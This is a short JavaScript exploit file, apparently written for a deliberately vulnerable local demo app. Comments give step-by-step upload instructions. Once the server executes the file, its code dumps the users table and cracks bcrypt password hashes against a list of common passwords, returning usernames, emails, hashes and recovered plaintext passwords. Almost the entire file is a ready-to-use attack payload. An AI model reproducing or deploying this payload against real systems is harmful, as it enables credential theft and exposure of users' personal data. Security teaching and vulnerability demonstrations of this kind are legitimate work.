/**
 * Malicious JavaScript File - Data Extraction Exploit
 * 
 * This file demonstrates the file upload vulnerability.
 * When uploaded and executed by the vulnerable server, it will:
 * - Access the user database
 * - Extract all user information
 * - Return plaintext passwords
 * - Expose sensitive data
 * 
 * USAGE:
 * 1. Login to vulnerable app (http://localhost:3001)
 * 2. Go to Upload File page
 * 3. Upload this file (user-data-exploit.js)
 * 4. Server will execute this code and display all user data!
 */

// This function will be called by the vulnerable server
async function getData() {
  // Access to 'users' and 'bcrypt' is injected by the server
  // This is the CRITICAL vulnerability!
  
  const extractedData = users.map(user => {
    // Try to crack the password or get it from known defaults
    let plaintext = '';
    
    // Check against common passwords
    const commonPasswords = [
      'fathan123', 'ryan123', 'admin123',
      'password', 'password123', '123456', 'admin'
    ];
    
    for (const pwd of commonPasswords) {
      if (bcrypt.compareSync(pwd, user.password)) {
        plaintext = pwd;
        break;
      }
    }
    
    return {
      username: user.username,
      email: user.email,
      password_hash: user.password,
      plaintext: plaintext || '[Unable to crack]'
    };
  });
  
  return extractedData;
}

// Export for server execution
// The vulnerable server will call getData() and display results
